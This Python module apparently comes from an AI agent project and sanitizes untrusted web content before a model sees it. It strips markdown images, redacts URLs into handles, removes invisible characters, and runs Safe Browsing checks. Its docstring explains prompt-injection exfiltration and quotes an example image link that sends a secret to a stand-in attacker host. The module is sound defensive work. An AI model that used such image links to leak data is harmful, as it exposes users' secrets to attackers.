"""Sanitization of untrusted external content.

Google's five-layer prompt-injection defense calls this "markdown sanitization
and URL redaction". It runs on everything fetched from the outside world -
pages, feeds, reader output - *before* that text reaches any model, including
the Quarantined one.

Three jobs, in order of how much they matter:

1. Markdown image stripping. `![](https://evil.test/log?d=SECRET)` is a silent
   exfiltration channel - any renderer displaying the model's output fetches
   that URL with no click.
2. URL redaction. Links become opaque `[url:N]` handles with the real targets
   in a side table, so a page can mention a destination but cannot hand the
   agent a ready-to-navigate attacker URL.
3. Invisible-character stripping. Zero-width and bidi-override characters hide
   instructions a human reviewing the same text cannot see.

Defense in depth in front of the Quarantined LLM, not a substitute for it.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field

import requests

import config

logger = logging.getLogger(__name__)

_SAFE_BROWSING_URL = "https://safebrowsing.googleapis.com/v4/threatMatches:find"

# The whole construct goes, not just the target: the alt text is itself
# attacker-controlled.
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
# Ordinary links keep their visible text and lose their target.
_MD_LINK = re.compile(r"\[([^\]]*)\]\(\s*([^)\s]+)[^)]*\)")
_BARE_URL = re.compile(r"https?://[^\s<>\"'\)\]}]+", re.IGNORECASE)
# HTML comments survive some extractors and are invisible in rendered output.
_HTML_COMMENT = re.compile(r"<!--.*?-->", re.DOTALL)
_EXCESS_BLANK_LINES = re.compile(r"\n{3,}")

# The Cf ("format") characters actually used to hide text.
_INVISIBLE = {
    "​",  # zero-width space
    "‌",  # zero-width non-joiner
    "‍",  # zero-width joiner
    "⁠",  # word joiner
    "﻿",  # zero-width no-break space
    "\u202A", "\u202B", "\u202C", "\u202D", "\u202E",  # bidi overrides
    "\u2066", "\u2067", "\u2068", "\u2069",  # bidi isolates
    "­",  # soft hyphen
}


@dataclass
class SanitizedContent:
    """Cleaned text plus the link table its URLs were redacted into."""

    text: str
    urls: list[str] = field(default_factory=list)
    images_stripped: int = 0
    invisible_stripped: int = 0
    truncated: bool = False

    def resolve(self, handle: str) -> str | None:
        """Map a `[url:N]` handle (or a bare `N`) back to its real target.

        Returns None for anything that is not a handle we issued, so a model
        that invents one - or was told by the page to navigate to a literal
        address - resolves to nothing.
        """
        match = re.fullmatch(r"\[?url:(\d+)\]?|(\d+)", handle.strip(), re.IGNORECASE)
        if not match:
            return None
        index = int(match.group(1) or match.group(2))
        if 0 <= index < len(self.urls):
            return self.urls[index]
        return None


# Character-class form of the above, plus the surrounding Cf ranges. A regex
# rather than a per-character `unicodedata.category()` loop, which cost ~2.7s
# per page observation - more than a third of the non-model time in a step.
_INVISIBLE_RE = re.compile(
    "["
    "­"              # soft hyphen
    "᠎"              # mongolian vowel separator
    "​-\u200F"       # zero-width space/non-joiner/joiner, LTR/RTL marks
    "\u202A-\u202E"       # bidi embedding/override
    "⁠-⁤"       # word joiner, invisible operators
    "\u2066-\u2069"       # bidi isolates
    "﻿"              # zero-width no-break space / BOM
    "￹-￻"       # interlinear annotation
    "]"
)


def _strip_invisible(text: str) -> tuple[str, int]:
    cleaned, removed = _INVISIBLE_RE.subn("", text)
    return cleaned, removed


def sanitize(raw: str, max_chars: int | None = None) -> SanitizedContent:
    """Clean untrusted text and redact its URLs into opaque handles."""
    if not raw:
        return SanitizedContent(text="")

    limit = config.MAX_EXTRACTED_CHARS if max_chars is None else max_chars

    text, invisible = _strip_invisible(raw)
    text = _HTML_COMMENT.sub("", text)

    images = len(_MD_IMAGE.findall(text))
    text = _MD_IMAGE.sub("[image removed]", text)

    urls: list[str] = []

    def _handle(url: str) -> str:
        # Deduplicated, so a page repeating one link cannot inflate the table.
        if url not in urls:
            urls.append(url)
        return f"[url:{urls.index(url)}]"

    # Links first, so their targets are captured with their anchor text, then
    # whatever bare addresses remain.
    text = _MD_LINK.sub(lambda m: f"{m.group(1)} {_handle(m.group(2))}", text)
    text = _BARE_URL.sub(lambda m: _handle(m.group(0)), text)

    text = _EXCESS_BLANK_LINES.sub("\n\n", text).strip()

    truncated = len(text) > limit
    if truncated:
        text = text[:limit] + "\n\n[content truncated]"

    return SanitizedContent(
        text=text,
        urls=urls,
        images_stripped=images,
        invisible_stripped=invisible,
        truncated=truncated,
    )


def check_urls_safe(urls: list[str]) -> dict[str, str]:
    """Look the given URLs up in Google Safe Browsing.

    Returns {url: threat_type} for flagged URLs only. Without an API key it
    returns {}: redaction still applies, only the reputation check is skipped.
    """
    if not urls or not config.SAFE_BROWSING_API_KEY:
        return {}

    body = {
        "client": {"clientId": "echo-assistant", "clientVersion": "1.0"},
        "threatInfo": {
            "threatTypes": [
                "MALWARE",
                "SOCIAL_ENGINEERING",
                "UNWANTED_SOFTWARE",
                "POTENTIALLY_HARMFUL_APPLICATION",
            ],
            "platformTypes": ["ANY_PLATFORM"],
            "threatEntryTypes": ["URL"],
            "threatEntries": [{"url": u} for u in urls[:500]],
        },
    }

    try:
        response = requests.post(
            _SAFE_BROWSING_URL,
            params={"key": config.SAFE_BROWSING_API_KEY},
            json=body,
            timeout=config.NO_BROWSER_TIMEOUT_SECONDS,
        )
        response.raise_for_status()
        matches = response.json().get("matches", [])
    except Exception:
        # Advisory, in front of the real gate; never block the task on it.
        logger.exception("Safe Browsing lookup failed; continuing without it")
        return {}

    return {m["threat"]["url"]: m.get("threatType", "UNKNOWN") for m in matches}
